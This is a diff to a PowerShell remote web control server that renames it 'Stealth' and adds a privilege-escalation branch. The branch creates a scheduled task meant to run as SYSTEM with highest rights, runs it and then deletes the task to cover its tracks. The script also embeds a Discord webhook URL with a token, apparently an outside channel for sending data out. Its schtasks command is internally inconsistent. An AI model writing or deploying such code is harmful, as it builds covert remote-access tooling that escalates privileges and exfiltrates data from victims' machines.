@@ -1,4 +1,4 @@
-# Simple Remote Web Control Server
+# Stealth Remote Web Control Server
 $webhook = "https://discord.com/api/webhooks/1462473064397672664/EGBQMFQBUQoXW7tk5frXJlkxFmSDln9vDIaZt4lGTXdzQ0xMyIG9WWpqI-EF7ipRt49O"
 $port = 8080
 
@@ -10,9 +10,19 @@ Add-Type -AssemblyName System.Drawing
 # Check if running as administrator
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-NOT $isAdmin) {
-    # Restart as administrator
+    # Create scheduled task for admin elevation
+    $taskName = "WebRemoteAdmin"
     $scriptPath = $MyInvocation.MyCommand.Path
-    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
+    $command = "powershell -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
+    
+    # Create scheduled task with highest privileges
+    schtasks /create /tn $taskName /tr "powershell.exe" /sc onlogon /rl highest /f /ru "SYSTEM" /st 00:00 /ri 1 /du 0001:00:00 /v1 /f
+    schtasks /run /tn $taskName
+    
+    # Wait a moment then delete the task
+    Start-Sleep -Seconds 2
+    schtasks /delete /tn $taskName /f
+    
     exit
 }
 
@@ -54,7 +64,6 @@ $html = @"
         button { background: #4CAF50; color: white; cursor: pointer; }
         button:hover { background: #45a049; }
         .output { background: #000; padding: 10px; margin: 10px 0; border-radius: 3px; font-family: monospace; white-space: pre-wrap; max-height: 500px; overflow-y: auto; }
-        .file-upload { border: 2px dashed #555; padding: 20px; margin: 10px 0; text-align: center; }
     </style>
 </head>
 <body>
